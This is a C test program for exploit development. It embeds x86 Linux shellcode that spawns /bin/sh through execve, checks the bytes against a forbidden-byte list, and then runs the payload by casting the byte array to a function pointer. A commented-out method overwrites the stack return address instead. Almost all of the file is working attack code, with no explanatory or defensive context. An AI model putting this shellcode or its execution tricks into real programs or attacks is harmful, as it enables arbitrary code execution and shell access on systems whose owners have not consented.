char forbidden[] = {};

char shellcode[] = "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x30\x61\x61\x61\x61\x62\x62\x62\x62";

int check()
{
    int i, j;

    for(i=0;shellcode[i];i++)
    {
        for(j=0;forbidden[j];j++)
        {
            if(shellcode[i] == forbidden[j])
            {
                printf("Forbidden byte detected !\n");
                printf("Byte i = 0x%x in shellcode is %p, which is at j = 0x%x in forbidden\n", i, shellcode[i] & 0xff, j);
            }
        }
    }
}

int main()
{
    printf("Length: %d bytes\n", strlen(shellcode));
    check();

    /* Method 1 */
    // int* ret;
    // ret = (int*)&ret + 2;
    // (*ret) = (int) shellcode;

    /* Method 2 */
    (*(void(*)()) shellcode)();
}
